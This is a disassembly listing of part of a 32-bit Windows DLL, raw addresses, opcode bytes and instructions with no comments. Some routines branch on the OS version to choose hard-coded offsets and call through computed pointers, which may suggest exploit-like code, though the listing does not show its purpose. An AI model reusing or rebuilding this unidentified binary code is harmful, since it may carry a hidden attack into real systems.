1000a891:	6a 01                	push   $0x1
1000a893:	58                   	pop    %eax
1000a894:	c3                   	ret
1000a895:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000a898:	33 db                	xor    %ebx,%ebx
1000a89a:	8b 75 08             	mov    0x8(%ebp),%esi
1000a89d:	89 5e 10             	mov    %ebx,0x10(%esi)
1000a8a0:	89 5e 14             	mov    %ebx,0x14(%esi)
1000a8a3:	89 5e 18             	mov    %ebx,0x18(%esi)
1000a8a6:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000a8a9:	c6 46 4c 01          	movb   $0x1,0x4c(%esi)
1000a8ad:	33 c0                	xor    %eax,%eax
1000a8af:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a8b3:	eb 0e                	jmp    0x1000a8c3
1000a8b5:	6a 01                	push   $0x1
1000a8b7:	58                   	pop    %eax
1000a8b8:	c3                   	ret
1000a8b9:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000a8bc:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a8c0:	6a d5                	push   $0xffffffd5
1000a8c2:	58                   	pop    %eax
1000a8c3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000a8c6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000a8cd:	5f                   	pop    %edi
1000a8ce:	5e                   	pop    %esi
1000a8cf:	5b                   	pop    %ebx
1000a8d0:	c9                   	leave
1000a8d1:	c3                   	ret
1000a8d2:	55                   	push   %ebp
1000a8d3:	8b ec                	mov    %esp,%ebp
1000a8d5:	6a ff                	push   $0xffffffff
1000a8d7:	68 e0 e5 00 10       	push   $0x1000e5e0
1000a8dc:	68 00 c6 00 10       	push   $0x1000c600
1000a8e1:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000a8e7:	50                   	push   %eax
1000a8e8:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000a8ef:	83 ec 10             	sub    $0x10,%esp
1000a8f2:	53                   	push   %ebx
1000a8f3:	56                   	push   %esi
1000a8f4:	57                   	push   %edi
1000a8f5:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000a8f8:	8b 75 08             	mov    0x8(%ebp),%esi
1000a8fb:	83 fe 0a             	cmp    $0xa,%esi
1000a8fe:	73 07                	jae    0x1000a907
1000a900:	b8 61 00 00 c0       	mov    $0xc0000061,%eax
1000a905:	eb 33                	jmp    0x1000a93a
1000a907:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000a90b:	56                   	push   %esi
1000a90c:	e8 38 00 00 00       	call   0x1000a949
1000a911:	56                   	push   %esi
1000a912:	e8 d0 00 00 00       	call   0x1000a9e7
1000a917:	ff 76 48             	push   0x48(%esi)
1000a91a:	ff 76 44             	push   0x44(%esi)
1000a91d:	8d 46 1c             	lea    0x1c(%esi),%eax
1000a920:	50                   	push   %eax
1000a921:	ff 16                	call   *(%esi)
1000a923:	83 c4 14             	add    $0x14,%esp
1000a926:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a92a:	eb 0e                	jmp    0x1000a93a
1000a92c:	6a 01                	push   $0x1
1000a92e:	58                   	pop    %eax
1000a92f:	c3                   	ret
1000a930:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000a933:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a937:	6a d5                	push   $0xffffffd5
1000a939:	58                   	pop    %eax
1000a93a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000a93d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000a944:	5f                   	pop    %edi
1000a945:	5e                   	pop    %esi
1000a946:	5b                   	pop    %ebx
1000a947:	c9                   	leave
1000a948:	c3                   	ret
1000a949:	55                   	push   %ebp
1000a94a:	8b ec                	mov    %esp,%ebp
1000a94c:	6a ff                	push   $0xffffffff
1000a94e:	68 f0 e5 00 10       	push   $0x1000e5f0
1000a953:	68 00 c6 00 10       	push   $0x1000c600
1000a958:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000a95e:	50                   	push   %eax
1000a95f:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000a966:	83 ec 10             	sub    $0x10,%esp
1000a969:	53                   	push   %ebx
1000a96a:	56                   	push   %esi
1000a96b:	57                   	push   %edi
1000a96c:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000a96f:	33 db                	xor    %ebx,%ebx
1000a971:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000a974:	8b 75 08             	mov    0x8(%ebp),%esi
1000a977:	8d 7e 1c             	lea    0x1c(%esi),%edi
1000a97a:	53                   	push   %ebx
1000a97b:	6a 04                	push   $0x4
1000a97d:	8d 46 0c             	lea    0xc(%esi),%eax
1000a980:	50                   	push   %eax
1000a981:	ff 76 08             	push   0x8(%esi)
1000a984:	57                   	push   %edi
1000a985:	e8 08 1b 00 00       	call   0x1000c492
1000a98a:	83 c4 14             	add    $0x14,%esp
1000a98d:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000a990:	3b c3                	cmp    %ebx,%eax
1000a992:	74 06                	je     0x1000a99a
1000a994:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a998:	eb 3e                	jmp    0x1000a9d8
1000a99a:	39 5e 10             	cmp    %ebx,0x10(%esi)
1000a99d:	74 1f                	je     0x1000a9be
1000a99f:	8b 4e 14             	mov    0x14(%esi),%ecx
1000a9a2:	3b cb                	cmp    %ebx,%ecx
1000a9a4:	74 18                	je     0x1000a9be
1000a9a6:	8d 46 18             	lea    0x18(%esi),%eax
1000a9a9:	39 18                	cmp    %ebx,(%eax)
1000a9ab:	74 11                	je     0x1000a9be
1000a9ad:	53                   	push   %ebx
1000a9ae:	6a 04                	push   $0x4
1000a9b0:	50                   	push   %eax
1000a9b1:	51                   	push   %ecx
1000a9b2:	57                   	push   %edi
1000a9b3:	e8 da 1a 00 00       	call   0x1000c492
1000a9b8:	83 c4 14             	add    $0x14,%esp
1000a9bb:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000a9be:	c6 46 4d 01          	movb   $0x1,0x4d(%esi)
1000a9c2:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a9c6:	33 c0                	xor    %eax,%eax
1000a9c8:	eb 0e                	jmp    0x1000a9d8
1000a9ca:	6a 01                	push   $0x1
1000a9cc:	58                   	pop    %eax
1000a9cd:	c3                   	ret
1000a9ce:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000a9d1:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a9d5:	6a d5                	push   $0xffffffd5
1000a9d7:	58                   	pop    %eax
1000a9d8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000a9db:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000a9e2:	5f                   	pop    %edi
1000a9e3:	5e                   	pop    %esi
1000a9e4:	5b                   	pop    %ebx
1000a9e5:	c9                   	leave
1000a9e6:	c3                   	ret
1000a9e7:	55                   	push   %ebp
1000a9e8:	8b ec                	mov    %esp,%ebp
1000a9ea:	6a ff                	push   $0xffffffff
1000a9ec:	68 00 e6 00 10       	push   $0x1000e600
1000a9f1:	68 00 c6 00 10       	push   $0x1000c600
1000a9f6:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000a9fc:	50                   	push   %eax
1000a9fd:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000aa04:	83 ec 18             	sub    $0x18,%esp
1000aa07:	53                   	push   %ebx
1000aa08:	56                   	push   %esi
1000aa09:	57                   	push   %edi
1000aa0a:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000aa0d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000aa11:	8b 45 08             	mov    0x8(%ebp),%eax
1000aa14:	8b 48 30             	mov    0x30(%eax),%ecx
1000aa17:	89 4d e0             	mov    %ecx,-0x20(%ebp)
1000aa1a:	85 c9                	test   %ecx,%ecx
1000aa1c:	74 26                	je     0x1000aa44
1000aa1e:	c6 45 dc eb          	movb   $0xeb,-0x24(%ebp)
1000aa22:	6a 00                	push   $0x0
1000aa24:	6a 01                	push   $0x1
1000aa26:	8d 55 dc             	lea    -0x24(%ebp),%edx
1000aa29:	52                   	push   %edx
1000aa2a:	51                   	push   %ecx
1000aa2b:	83 c0 1c             	add    $0x1c,%eax
1000aa2e:	50                   	push   %eax
1000aa2f:	e8 5e 1a 00 00       	call   0x1000c492
1000aa34:	83 c4 14             	add    $0x14,%esp
1000aa37:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000aa3a:	85 c0                	test   %eax,%eax
1000aa3c:	74 06                	je     0x1000aa44
1000aa3e:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000aa42:	eb 16                	jmp    0x1000aa5a
1000aa44:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000aa48:	33 c0                	xor    %eax,%eax
1000aa4a:	eb 0e                	jmp    0x1000aa5a
1000aa4c:	6a 01                	push   $0x1
1000aa4e:	58                   	pop    %eax
1000aa4f:	c3                   	ret
1000aa50:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000aa53:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000aa57:	6a d5                	push   $0xffffffd5
1000aa59:	58                   	pop    %eax
1000aa5a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000aa5d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000aa64:	5f                   	pop    %edi
1000aa65:	5e                   	pop    %esi
1000aa66:	5b                   	pop    %ebx
1000aa67:	c9                   	leave
1000aa68:	c3                   	ret
1000aa69:	55                   	push   %ebp
1000aa6a:	8b ec                	mov    %esp,%ebp
1000aa6c:	6a ff                	push   $0xffffffff
1000aa6e:	68 10 e6 00 10       	push   $0x1000e610
1000aa73:	68 00 c6 00 10       	push   $0x1000c600
1000aa78:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000aa7e:	50                   	push   %eax
1000aa7f:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000aa86:	83 ec 30             	sub    $0x30,%esp
1000aa89:	53                   	push   %ebx
1000aa8a:	56                   	push   %esi
1000aa8b:	57                   	push   %edi
1000aa8c:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000aa8f:	8b 7d 08             	mov    0x8(%ebp),%edi
1000aa92:	85 ff                	test   %edi,%edi
1000aa94:	0f 84 c4 00 00 00    	je     0x1000ab5e
1000aa9a:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
1000aa9e:	0f 84 ba 00 00 00    	je     0x1000ab5e
1000aaa4:	8d 5f 1c             	lea    0x1c(%edi),%ebx
1000aaa7:	68 54 05 01 10       	push   $0x10010554
1000aaac:	53                   	push   %ebx
1000aaad:	e8 b7 f0 ff ff       	call   0x10009b69
1000aab2:	59                   	pop    %ecx
1000aab3:	59                   	pop    %ecx
1000aab4:	8b f0                	mov    %eax,%esi
1000aab6:	85 f6                	test   %esi,%esi
1000aab8:	0f 84 a0 00 00 00    	je     0x1000ab5e
1000aabe:	68 40 05 01 10       	push   $0x10010540
1000aac3:	53                   	push   %ebx
1000aac4:	e8 a0 f0 ff ff       	call   0x10009b69
1000aac9:	59                   	pop    %ecx
1000aaca:	59                   	pop    %ecx
1000aacb:	85 c0                	test   %eax,%eax
1000aacd:	0f 84 8b 00 00 00    	je     0x1000ab5e
1000aad3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000aad6:	89 01                	mov    %eax,(%ecx)
1000aad8:	89 77 04             	mov    %esi,0x4(%edi)
1000aadb:	83 67 10 00          	andl   $0x0,0x10(%edi)
1000aadf:	2b 77 20             	sub    0x20(%edi),%esi
1000aae2:	89 75 dc             	mov    %esi,-0x24(%ebp)
1000aae5:	68 28 05 01 10       	push   $0x10010528
1000aaea:	ff 33                	push   (%ebx)
1000aaec:	ff 15 1c e1 00 10    	call   *0x1000e11c
1000aaf2:	8b d0                	mov    %eax,%edx
1000aaf4:	89 55 d8             	mov    %edx,-0x28(%ebp)
1000aaf7:	33 c0                	xor    %eax,%eax
1000aaf9:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000aafc:	89 45 cc             	mov    %eax,-0x34(%ebp)
1000aaff:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000ab02:	bb ff ff bf ff       	mov    $0xffbfffff,%ebx
1000ab07:	83 f8 64             	cmp    $0x64,%eax
1000ab0a:	7d 2f                	jge    0x1000ab3b
1000ab0c:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
1000ab0f:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
1000ab12:	8b 09                	mov    (%ecx),%ecx
1000ab14:	23 cb                	and    %ebx,%ecx
1000ab16:	89 4d c8             	mov    %ecx,-0x38(%ebp)
1000ab19:	3b 4d dc             	cmp    -0x24(%ebp),%ecx
1000ab1c:	75 2b                	jne    0x1000ab49
1000ab1e:	8d 54 10 09          	lea    0x9(%eax,%edx,1),%edx
1000ab22:	89 55 c4             	mov    %edx,-0x3c(%ebp)
1000ab25:	8b 12                	mov    (%edx),%edx
1000ab27:	23 d3                	and    %ebx,%edx
1000ab29:	89 55 c0             	mov    %edx,-0x40(%ebp)
1000ab2c:	8b f2                	mov    %edx,%esi
1000ab2e:	33 f1                	xor    %ecx,%esi
1000ab30:	f7 c6 00 f0 ff ff    	test   $0xfffff000,%esi
1000ab36:	75 0e                	jne    0x1000ab46
1000ab38:	89 55 cc             	mov    %edx,-0x34(%ebp)
1000ab3b:	8b 47 20             	mov    0x20(%edi),%eax
1000ab3e:	03 45 cc             	add    -0x34(%ebp),%eax
1000ab41:	89 47 10             	mov    %eax,0x10(%edi)
1000ab44:	eb 10                	jmp    0x1000ab56
1000ab46:	8b 55 d8             	mov    -0x28(%ebp),%edx
1000ab49:	40                   	inc    %eax
1000ab4a:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000ab4d:	eb b8                	jmp    0x1000ab07
1000ab4f:	6a 01                	push   $0x1
1000ab51:	58                   	pop    %eax
1000ab52:	c3                   	ret
1000ab53:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000ab56:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000ab5a:	b0 01                	mov    $0x1,%al
1000ab5c:	eb 02                	jmp    0x1000ab60
1000ab5e:	32 c0                	xor    %al,%al
1000ab60:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000ab63:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000ab6a:	5f                   	pop    %edi
1000ab6b:	5e                   	pop    %esi
1000ab6c:	5b                   	pop    %ebx
1000ab6d:	c9                   	leave
1000ab6e:	c3                   	ret
1000ab6f:	55                   	push   %ebp
1000ab70:	8b ec                	mov    %esp,%ebp
1000ab72:	6a ff                	push   $0xffffffff
1000ab74:	68 20 e6 00 10       	push   $0x1000e620
1000ab79:	68 00 c6 00 10       	push   $0x1000c600
1000ab7e:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000ab84:	50                   	push   %eax
1000ab85:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000ab8c:	81 ec 8c 03 00 00    	sub    $0x38c,%esp
1000ab92:	53                   	push   %ebx
1000ab93:	56                   	push   %esi
1000ab94:	57                   	push   %edi
1000ab95:	33 db                	xor    %ebx,%ebx
1000ab97:	8b 75 08             	mov    0x8(%ebp),%esi
1000ab9a:	3b f3                	cmp    %ebx,%esi
1000ab9c:	0f 84 2a 05 00 00    	je     0x1000b0cc
1000aba2:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
1000aba5:	0f 84 21 05 00 00    	je     0x1000b0cc
1000abab:	8b 45 10             	mov    0x10(%ebp),%eax
1000abae:	3b c3                	cmp    %ebx,%eax
1000abb0:	0f 84 16 05 00 00    	je     0x1000b0cc
1000abb6:	89 45 94             	mov    %eax,-0x6c(%ebp)
1000abb9:	8b 45 14             	mov    0x14(%ebp),%eax
1000abbc:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000abbf:	8b 45 18             	mov    0x18(%ebp),%eax
1000abc2:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000abc5:	8d 86 00 02 00 00    	lea    0x200(%esi),%eax
1000abcb:	89 85 68 fc ff ff    	mov    %eax,-0x398(%ebp)
1000abd1:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000abd4:	88 5d e0             	mov    %bl,-0x20(%ebp)
1000abd7:	88 5d e1             	mov    %bl,-0x1f(%ebp)
1000abda:	68 14 05 01 10       	push   $0x10010514
1000abdf:	e8 71 1b 00 00       	call   0x1000c755
1000abe4:	59                   	pop    %ecx
1000abe5:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000abe8:	3b c3                	cmp    %ebx,%eax
1000abea:	75 07                	jne    0x1000abf3
1000abec:	6a ba                	push   $0xffffffba
1000abee:	e9 db 04 00 00       	jmp    0x1000b0ce
1000abf3:	8d 45 8c             	lea    -0x74(%ebp),%eax
1000abf6:	50                   	push   %eax
1000abf7:	8d 45 88             	lea    -0x78(%ebp),%eax
1000abfa:	50                   	push   %eax
1000abfb:	e8 b7 12 00 00       	call   0x1000beb7
1000ac00:	59                   	pop    %ecx
1000ac01:	59                   	pop    %ecx
1000ac02:	3b c3                	cmp    %ebx,%eax
1000ac04:	74 07                	je     0x1000ac0d
1000ac06:	6a d4                	push   $0xffffffd4
1000ac08:	e9 c1 04 00 00       	jmp    0x1000b0ce
1000ac0d:	8d 45 b0             	lea    -0x50(%ebp),%eax
1000ac10:	50                   	push   %eax
1000ac11:	e8 bd ef ff ff       	call   0x10009bd3
1000ac16:	59                   	pop    %ecx
1000ac17:	84 c0                	test   %al,%al
1000ac19:	75 07                	jne    0x1000ac22
1000ac1b:	6a c3                	push   $0xffffffc3
1000ac1d:	e9 ac 04 00 00       	jmp    0x1000b0ce
1000ac22:	83 4d 84 ff          	orl    $0xffffffff,-0x7c(%ebp)
1000ac26:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000ac29:	89 9d c4 fe ff ff    	mov    %ebx,-0x13c(%ebp)
1000ac2f:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
1000ac35:	50                   	push   %eax
1000ac36:	8d 45 94             	lea    -0x6c(%ebp),%eax
1000ac39:	50                   	push   %eax
1000ac3a:	e8 2a 07 00 00       	call   0x1000b369
1000ac3f:	59                   	pop    %ecx
1000ac40:	59                   	pop    %ecx
1000ac41:	84 c0                	test   %al,%al
1000ac43:	75 0c                	jne    0x1000ac51
1000ac45:	c7 45 84 c1 ff ff ff 	movl   $0xffffffc1,-0x7c(%ebp)
1000ac4c:	e9 59 04 00 00       	jmp    0x1000b0aa
1000ac51:	6a 0d                	push   $0xd
1000ac53:	8d 45 94             	lea    -0x6c(%ebp),%eax
1000ac56:	50                   	push   %eax
1000ac57:	6a 07                	push   $0x7
1000ac59:	68 de b0 00 10       	push   $0x1000b0de
1000ac5e:	56                   	push   %esi
1000ac5f:	6a 17                	push   $0x17
1000ac61:	68 70 05 01 10       	push   $0x10010570
1000ac66:	e8 ca eb ff ff       	call   0x10009835
1000ac6b:	89 b5 88 fe ff ff    	mov    %esi,-0x178(%ebp)
1000ac71:	8b c6                	mov    %esi,%eax
1000ac73:	c1 e8 10             	shr    $0x10,%eax
1000ac76:	89 85 7c fc ff ff    	mov    %eax,-0x384(%ebp)
1000ac7c:	bf 9c 00 00 00       	mov    $0x9c,%edi
1000ac81:	57                   	push   %edi
1000ac82:	53                   	push   %ebx
1000ac83:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
1000ac89:	50                   	push   %eax
1000ac8a:	e8 87 26 00 00       	call   0x1000d316
1000ac8f:	83 c4 28             	add    $0x28,%esp
1000ac92:	89 bd cc fe ff ff    	mov    %edi,-0x134(%ebp)
1000ac98:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
1000ac9e:	50                   	push   %eax
1000ac9f:	ff 15 b8 e0 00 10    	call   *0x1000e0b8
1000aca5:	c7 85 6c fc ff ff 9c 	movl   $0x1001059c,-0x394(%ebp)
1000acac:	05 01 10 
1000acaf:	6a 0a                	push   $0xa
1000acb1:	5f                   	pop    %edi
1000acb2:	89 bd 68 ff ff ff    	mov    %edi,-0x98(%ebp)
1000acb8:	83 bd d0 fe ff ff 05 	cmpl   $0x5,-0x130(%ebp)
1000acbf:	75 1e                	jne    0x1000acdf
1000acc1:	83 bd d4 fe ff ff 01 	cmpl   $0x1,-0x12c(%ebp)
1000acc8:	75 15                	jne    0x1000acdf
1000acca:	66 39 9d 60 ff ff ff 	cmp    %bx,-0xa0(%ebp)
1000acd1:	75 0c                	jne    0x1000acdf
1000acd3:	c7 85 74 ff ff ff a4 	movl   $0xa4,-0x8c(%ebp)
1000acda:	00 00 00 
1000acdd:	eb 5c                	jmp    0x1000ad3b
1000acdf:	66 83 bd 60 ff ff ff 	cmpw   $0x1,-0xa0(%ebp)
1000ace6:	01 
1000ace7:	75 0c                	jne    0x1000acf5
1000ace9:	c7 85 74 ff ff ff a0 	movl   $0xa0,-0x8c(%ebp)
1000acf0:	00 00 00 
1000acf3:	eb 46                	jmp    0x1000ad3b
1000acf5:	66 83 bd 60 ff ff ff 	cmpw   $0x2,-0xa0(%ebp)
1000acfc:	02 
1000acfd:	75 22                	jne    0x1000ad21
1000acff:	68 b4 05 01 10       	push   $0x100105b4
1000ad04:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
1000ad0a:	50                   	push   %eax
1000ad0b:	ff 15 b0 e1 00 10    	call   *0x1000e1b0
1000ad11:	59                   	pop    %ecx
1000ad12:	59                   	pop    %ecx
1000ad13:	85 c0                	test   %eax,%eax
1000ad15:	c7 85 74 ff ff ff a0 	movl   $0xa0,-0x8c(%ebp)
1000ad1c:	00 00 00 
1000ad1f:	75 0a                	jne    0x1000ad2b
1000ad21:	c7 85 74 ff ff ff a4 	movl   $0xa4,-0x8c(%ebp)
1000ad28:	00 00 00 
1000ad2b:	c7 85 6c fc ff ff a8 	movl   $0x100105a8,-0x394(%ebp)
1000ad32:	05 01 10 
1000ad35:	89 bd 68 ff ff ff    	mov    %edi,-0x98(%ebp)
1000ad3b:	c7 85 94 fe ff ff 30 	movl   $0x30,-0x16c(%ebp)
1000ad42:	00 00 00 
1000ad45:	89 9d 98 fe ff ff    	mov    %ebx,-0x168(%ebp)
1000ad4b:	89 9d 9c fe ff ff    	mov    %ebx,-0x164(%ebp)
1000ad51:	89 9d a0 fe ff ff    	mov    %ebx,-0x160(%ebp)
1000ad57:	89 9d a8 fe ff ff    	mov    %ebx,-0x158(%ebp)
1000ad5d:	89 9d ac fe ff ff    	mov    %ebx,-0x154(%ebp)
1000ad63:	89 9d b0 fe ff ff    	mov    %ebx,-0x150(%ebp)
1000ad69:	89 9d b4 fe ff ff    	mov    %ebx,-0x14c(%ebp)
1000ad6f:	89 9d b8 fe ff ff    	mov    %ebx,-0x148(%ebp)
1000ad75:	89 9d bc fe ff ff    	mov    %ebx,-0x144(%ebp)
1000ad7b:	89 9d c0 fe ff ff    	mov    %ebx,-0x140(%ebp)
1000ad81:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
1000ad87:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
1000ad8d:	0f b7 85 74 ff ff ff 	movzwl -0x8c(%ebp),%eax
1000ad94:	89 85 64 fc ff ff    	mov    %eax,-0x39c(%ebp)
1000ad9a:	2b f0                	sub    %eax,%esi
1000ad9c:	81 e6 ff ff 00 00    	and    $0xffff,%esi
1000ada2:	89 b5 a4 fe ff ff    	mov    %esi,-0x15c(%ebp)
1000ada8:	68 f4 04 01 10       	push   $0x100104f4
1000adad:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000adb3:	50                   	push   %eax
1000adb4:	ff 15 8c e1 00 10    	call   *0x1000e18c
1000adba:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000adc0:	50                   	push   %eax
1000adc1:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000adc7:	83 c4 0c             	add    $0xc,%esp
1000adca:	d1 e0                	shl    $1,%eax
1000adcc:	66 89 85 80 fe ff ff 	mov    %ax,-0x180(%ebp)
1000add3:	66 c7 85 82 fe ff ff 	movw   $0x200,-0x17e(%ebp)
1000adda:	00 02 
1000addc:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000ade2:	89 85 84 fe ff ff    	mov    %eax,-0x17c(%ebp)
1000ade8:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
1000adee:	89 85 8c fe ff ff    	mov    %eax,-0x174(%ebp)
1000adf4:	89 9d 70 ff ff ff    	mov    %ebx,-0x90(%ebp)
1000adfa:	89 9d 70 fc ff ff    	mov    %ebx,-0x390(%ebp)
1000ae00:	6a 08                	push   $0x8
1000ae02:	53                   	push   %ebx
1000ae03:	8b 35 c4 e0 00 10    	mov    0x1000e0c4,%esi
1000ae09:	ff d6                	call   *%esi
1000ae0b:	8b f8                	mov    %eax,%edi
1000ae0d:	89 bd 70 ff ff ff    	mov    %edi,-0x90(%ebp)
1000ae13:	6a 10                	push   $0x10
1000ae15:	53                   	push   %ebx
1000ae16:	ff d6                	call   *%esi
1000ae18:	8b f0                	mov    %eax,%esi
1000ae1a:	89 b5 70 fc ff ff    	mov    %esi,-0x390(%ebp)
1000ae20:	6a 08                	push   $0x8
1000ae22:	53                   	push   %ebx
1000ae23:	57                   	push   %edi
1000ae24:	e8 ed 24 00 00       	call   0x1000d316
1000ae29:	6a 10                	push   $0x10
1000ae2b:	53                   	push   %ebx
1000ae2c:	56                   	push   %esi
1000ae2d:	e8 e4 24 00 00       	call   0x1000d316
1000ae32:	6a 08                	push   $0x8
1000ae34:	53                   	push   %ebx
1000ae35:	8d 85 74 fc ff ff    	lea    -0x38c(%ebp),%eax
1000ae3b:	50                   	push   %eax
1000ae3c:	e8 d5 24 00 00       	call   0x1000d316
1000ae41:	89 bd 78 ff ff ff    	mov    %edi,-0x88(%ebp)
1000ae47:	89 b5 7c ff ff ff    	mov    %esi,-0x84(%ebp)
1000ae4d:	8d 85 74 fc ff ff    	lea    -0x38c(%ebp),%eax
1000ae53:	89 45 80             	mov    %eax,-0x80(%ebp)
1000ae56:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
1000ae5c:	89 85 c8 fe ff ff    	mov    %eax,-0x138(%ebp)
1000ae62:	8b 45 08             	mov    0x8(%ebp),%eax
1000ae65:	05 00 05 00 00       	add    $0x500,%eax
1000ae6a:	89 85 90 fe ff ff    	mov    %eax,-0x170(%ebp)
1000ae70:	6a 08                	push   $0x8
1000ae72:	6a 1c                	push   $0x1c
1000ae74:	50                   	push   %eax
1000ae75:	6a 0a                	push   $0xa
1000ae77:	ff b5 6c fc ff ff    	push   -0x394(%ebp)
1000ae7d:	e8 16 ea ff ff       	call   0x10009898
1000ae82:	83 c4 38             	add    $0x38,%esp
1000ae85:	50                   	push   %eax
1000ae86:	53                   	push   %ebx
1000ae87:	51                   	push   %ecx
1000ae88:	52                   	push   %edx
1000ae89:	56                   	push   %esi
1000ae8a:	57                   	push   %edi
1000ae8b:	6a 00                	push   $0x0
1000ae8d:	68 80 00 00 00       	push   $0x80
1000ae92:	68 56 02 00 00       	push   $0x256
1000ae97:	ff b5 c8 fe ff ff    	push   -0x138(%ebp)
1000ae9d:	ff b5 8c fe ff ff    	push   -0x174(%ebp)
1000aea3:	ff b5 8c fe ff ff    	push   -0x174(%ebp)
1000aea9:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
1000aeaf:	8b 45 88             	mov    -0x78(%ebp),%eax
1000aeb2:	ff 95 90 fe ff ff    	call   *-0x170(%ebp)
1000aeb8:	5f                   	pop    %edi
1000aeb9:	5e                   	pop    %esi
1000aeba:	5a                   	pop    %edx
1000aebb:	59                   	pop    %ecx
1000aebc:	5b                   	pop    %ebx
1000aebd:	58                   	pop    %eax
1000aebe:	33 db                	xor    %ebx,%ebx
1000aec0:	53                   	push   %ebx
1000aec1:	68 e4 04 01 10       	push   $0x100104e4
1000aec6:	ff 15 fc e1 00 10    	call   *0x1000e1fc
1000aecc:	8b 85 7c fc ff ff    	mov    -0x384(%ebp),%eax
1000aed2:	2b 85 64 fc ff ff    	sub    -0x39c(%ebp),%eax
1000aed8:	25 ff ff 00 00       	and    $0xffff,%eax
1000aedd:	89 85 a4 fe ff ff    	mov    %eax,-0x15c(%ebp)
1000aee3:	6a 08                	push   $0x8
1000aee5:	53                   	push   %ebx
1000aee6:	8b 35 c4 e0 00 10    	mov    0x1000e0c4,%esi
1000aeec:	ff d6                	call   *%esi
1000aeee:	8b f8                	mov    %eax,%edi
1000aef0:	89 bd 70 ff ff ff    	mov    %edi,-0x90(%ebp)
1000aef6:	6a 10                	push   $0x10
1000aef8:	53                   	push   %ebx
1000aef9:	ff d6                	call   *%esi
1000aefb:	8b f0                	mov    %eax,%esi
1000aefd:	89 b5 70 fc ff ff    	mov    %esi,-0x390(%ebp)
1000af03:	6a 08                	push   $0x8
1000af05:	53                   	push   %ebx
1000af06:	57                   	push   %edi
1000af07:	e8 0a 24 00 00       	call   0x1000d316
1000af0c:	6a 10                	push   $0x10
1000af0e:	53                   	push   %ebx
1000af0f:	56                   	push   %esi
1000af10:	e8 01 24 00 00       	call   0x1000d316
1000af15:	89 bd 78 ff ff ff    	mov    %edi,-0x88(%ebp)
1000af1b:	89 b5 7c ff ff ff    	mov    %esi,-0x84(%ebp)
1000af21:	68 c8 04 01 10       	push   $0x100104c8
1000af26:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000af2c:	50                   	push   %eax
